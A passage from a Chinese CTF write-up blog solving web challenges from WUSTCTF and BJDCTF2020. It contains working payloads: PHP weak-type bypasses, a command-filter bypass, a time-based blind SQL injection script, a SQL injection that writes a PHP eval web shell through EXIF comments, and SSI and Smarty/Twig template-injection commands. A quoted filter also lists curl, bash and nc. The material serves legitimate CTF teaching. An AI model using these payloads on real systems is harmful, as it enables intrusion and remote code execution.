src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708145300.png" alt=""></p><h3 id="WUSTCTF朴实无华-Revenge"><a href="#WUSTCTF朴实无华-Revenge" class="headerlink" title="WUSTCTF朴实无华_Revenge"></a>WUSTCTF朴实无华_Revenge</h3><p>wustctf朴实无华的改版</p><h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>level 1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    $numPositve &#x3D; intval($num);</span><br><span class="line">    $numReverse &#x3D; intval(strrev($num));</span><br><span class="line">    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( (preg_match_all(&quot;&#x2F;\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;</span><br><span class="line">            die(&quot;没有这样的数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($num !&#x3D; $numPositve) &#123;</span><br><span class="line">        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>$numPositve = intval($num);$numReverse = intval(strrev($num));</code>的同时需满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($num !&#x3D; $numPositve)  &#x3D;&#x3D;&gt; 传整数</span><br><span class="line">if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999)&#x3D;&#x3D;&gt;不能int溢出</span><br><span class="line">if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#x3D;&#x3D;&gt;不能是回文又要有回文的特点对称</span><br></pre></td></tr></table></figure><p>payload：<code>?num=1000000000000000.00000000000000010</code></p><p>num是弱类型判断，且php存在浮点精度问题，所以php中<code>1000000000000000.0000000000000001=1000000000000000</code>是成立的</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155152.png" alt=""></p><p>再加个0满足倒过来相等，且不是一个回文数</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155302.png" alt=""></p><p>level2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>if ($md5==md5(md5($md5)))</code>，由于是弱类型，所以构造一个以0e开头，经过两次md5之后依然还是以0e开头的纯数字串，这样利用科学计数法的特性在php中弱类型相等</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708155800.png" alt=""></p><p>这里直接用y1ng师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br></pre></td></tr></table></figure><p>得到<code>0e1138100474</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160006.png" alt=""></p><p>get flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'非预期修复*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了一些关键字，用一些字符阻断即可，比如ca\t&lt;flag.p\hp</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160311.png" alt=""></p><p>flag在源码里</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160335.png" alt=""></p><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>打开靶机一个登录框</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708160819.png" alt=""></p><p>源码直接给了sql语句</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708161156.png" alt=""></p><p>只要用户名含有admin，那么就不会die</p><p>sql语句可以用<code>\</code>来操作，本来的语句是</p><p><code>select * from 36d_user where username=&#39;admin&#39; and password=&#39;sql&#39;;</code></p><p>我们把用户名设为<code>admin\</code>，这样，原来的<code>&#39;</code>就被注明为一个文本符号，用户名就变成了<code>admin&#39; and password=</code></p><p><code>select * from 36d_user where username=&#39;admin\&#39; and password=&#39;sql&#39;;</code></p><p>再加个#把后面注释，这样传入的<code>$passwd</code>就可以逃逸出来，执行sql语句了</p><h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>fuzz一下发现select，union，ascii，空格，分号等等很多东西都被过滤了，但是sleep，regexp，binary没被过滤，因此有可能是时间盲注。</p><p>substr，mid啥的都过滤了，后来想到可以用right，left一起用来代替substr</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173622.png" alt=""></p><p>正好’^’也没过滤，可以尝试异或</p><p>当password是<code>^if(ord(right(left(password,1),1))like(35),sleep(4),1)#</code>时</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174923.png" alt=""></p><p>当password是<code>^if(ord(right(left(password,1),1))like(73),sleep(4),1)#</code>时</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175013.png" alt=""></p><p>直到四秒才返回，证明时间盲注可行</p><p>构造脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">"http://109b8f92-8675-4edc-a4b7-c6005bf771f9.chall.ctf.show/"</span></span><br><span class="line">k=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>): </span><br><span class="line">    <span class="keyword">for</span> j in k:</span><br><span class="line">        j = ord(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'admin\\'</span>,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'^if(ord(right(left(password,&#123;0&#125;),1))like(&#123;1&#125;),sleep(4),1)#'</span>.format(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url,data=data,timeout=(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        except:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑一会儿</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708173747.png" alt=""></p><p>登录即得flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708174012.png" alt=""></p><h3 id="你没见过的注入"><a href="#你没见过的注入" class="headerlink" title="你没见过的注入"></a>你没见过的注入</h3><p>打开靶机绝美前端</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708175956.png" alt=""></p><p>根据提示打开robots.txt，得到<code>/pwdreset.php</code>，可以重置密码，重置之后登录发现是个上传</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180221.png" alt=""></p><p>测试一下发现会将上传文件存储为压缩包，并显示文件类型，</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708180434.png" alt=""></p><h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><p>试了把sql语句写入文件名等等，都不起效果，当时记得还是阿狸师傅提醒了一下</p><p>版权信息注入（真*活久见）</p><p>测试一下，找一张jpg，用exiftools把语句写进comment</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184343.png" alt=""></p><p>上传，发现报错，把插入语句以及Sql报错信息显示了出来</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184328.png" alt=""></p><p> 那么可以注入了，构造<code>&quot;&#39;);select 0x3c3f70687020406576616c28245f504f53545b2761275d293b3f3e into outfile &#39;/var/www/html/blacknight.php&#39;;--+</code>把一句话写进</p><p>但写入的时候显示不全</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708184936.png" alt=""></p><p>所以换一个短的一句话：<code>&quot;&#39;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#39;/var/www/html/blacknight.php&#39;;--+</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708185939.png" alt=""></p><p>上传之后访问php，post一下即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708190019.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> bypass </tag>
            
            <tag> ssrf </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020web复现</title>
      <link href="/2020/07/03/BJD2020_web_wp/"/>
      <url>/2020/07/03/BJD2020_web_wp/</url>
      
        <content type="html"><![CDATA[<p>二月份的比赛，前几天做ezphp的时候发现有其他web的题目，索性全都复现一下，有些是之前buu做过了</p><a id="more"></a><p>docker环境：<a href="https://github.com/BjdsecCA/BJDCTF2020_January" target="_blank" rel="noopener">https://github.com/BjdsecCA/BJDCTF2020_January</a></p><p>平台：<a href="https://buuoj.cn" target="_blank" rel="noopener">https://buuoj.cn</a></p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>写在csdn上了，<a href="https://blog.csdn.net/qq_43756333/article/details/107034933" target="_blank" rel="noopener">传送</a></p><h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p>打开靶机只有一个提交框</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214524.png" alt=""></p><p>输啥都没有反应，抓了个包，返回头里看到hint</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214824.png" alt=""></p><h4 id="考点：mysql特性，MD5函数特殊字符串，php强弱类型"><a href="#考点：mysql特性，MD5函数特殊字符串，php强弱类型" class="headerlink" title="考点：mysql特性，MD5函数特殊字符串，php强弱类型"></a>考点：mysql特性，MD5函数特殊字符串，php强弱类型</h4><p>php中MD5函数的处理方式如下</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215403.png" alt=""></p><p>由于会返回原始二进制格式，我们来看看<code>ffifdyop</code>字符串的结果</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215956.png" alt=""></p><p>生成了’or’6以及一些不可见字符，那么再结合hint，他本来的语句是<br><code>select * from &#39;admin&#39; where password=&#39;传入处理后的值&#39;</code><br>当我们传入<code>ffifdyop</code>之后，就会变成<br><code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxx&#39;</code></p><p>而在mysql中，判断条件时，以数字为开头的字符串会被当做是整型，均会返回1，也就是true</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702221500.png" alt=""></p><p>那么password的or判断就接收true并绕过了这个语句。</p><p>传入之后跳转到了levels91.php，源码给出了php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    header(<span class="string">'Location: levell14.php'</span>);</span><br></pre></td></tr></table></figure><p>一个简单的弱类型，可以利用科学计数法特性提交两个md5后以0e开头的字符串，或者直接变为数组两个NULL相等绕过。</p><p>传入之后又跳转到levell14.php，强类型碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入两个md5后值相等的字符串或一样用数组即可。</p><h3 id="mark-loves-cat"><a href="#mark-loves-cat" class="headerlink" title="mark loves cat"></a>mark loves cat</h3><p>csdn上写过：<a href="https://blog.csdn.net/qq_43756333/article/details/106466696" target="_blank" rel="noopener">传送</a></p><h3 id="easy-search"><a href="#easy-search" class="headerlink" title="easy_search"></a>easy_search</h3><p>打开靶机一个登录框</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703144841.png" alt=""></p><p>请求index.php.swp得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到成功登录的关键，<code>$admin == substr(md5($_POST[&#39;password&#39;]),0,6)</code>，脚本爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(md5_val)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">999999</span>, <span class="number">100000000</span>):</span><br><span class="line">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>]==md5_val:</span><br><span class="line">            <span class="keyword">return</span> str(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> func(<span class="string">'6d0bc1'</span>)</span><br></pre></td></tr></table></figure><p>跑出来结果是202066，登录看看，headers里返回了url</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145648.png" alt=""></p><p>访问之后发现会回显username的内容</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145755.png" alt=""></p><h4 id="考点：ssi代码执行注入"><a href="#考点：ssi代码执行注入" class="headerlink" title="考点：ssi代码执行注入"></a>考点：ssi代码执行注入</h4><p>ssi是服务器端包含的意思，就是在html中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><p>在这里， shtml文件可以执行 bash 命令，构造<code>&lt;!--#exec Cmd=&quot;ls&quot;--&gt;</code>即可命令执行，最后在ls ../找到flag文件</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151212.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151109.png" alt=""></p><p>直接cat读取即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151614.png" alt=""></p><h3 id="the-mystery-of-ip"><a href="#the-mystery-of-ip" class="headerlink" title="the mystery of ip"></a>the mystery of ip</h3><p>打开靶机flag.php会显示出ip，抓包观察到xff头可以控制</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152750.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152726.png" alt=""></p><h4 id="考点：smarty模板注入"><a href="#考点：smarty模板注入" class="headerlink" title="考点：smarty模板注入"></a>考点：smarty模板注入</h4><p>构造<code>4</code>会直接得到4</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152931.png" alt=""></p><p>猜测为模板注入，尝试读取配置文件构造<code></code>发现是smarty模板。</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153049.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;&#125;或者&#123;if system(&#39;ls&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p>都可以执行命令，最后在根目录下找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153851.png" alt=""></p><h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>打开靶机在flag.php有个提交框会把输入内容输出到网页上</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154618.png" alt=""></p><p>构造4发现还会返回计算结果4</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154722.png" alt=""></p><h4 id="考点：Twig模板注入"><a href="#考点：Twig模板注入" class="headerlink" title="考点：Twig模板注入"></a>考点：Twig模板注入</h4><p>发现在cookie处</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154947.png" alt=""></p><p>user会把输入的内容存进去，<code>urldecode(%7B%7B2%2B2%7D%7D)=4</code>,首先了解一下使用的是什么模板，在<a href="https://blog.csdn.net/u011377996/article/details/86776181" target="_blank" rel="noopener">csdn师傅的一篇文章</a>找到流程图</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703155348.png" alt=""></p><p>输入49成功回显，但Jinja2是基于python的模板引擎，那么只能是Twig了，百度一下Twig的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 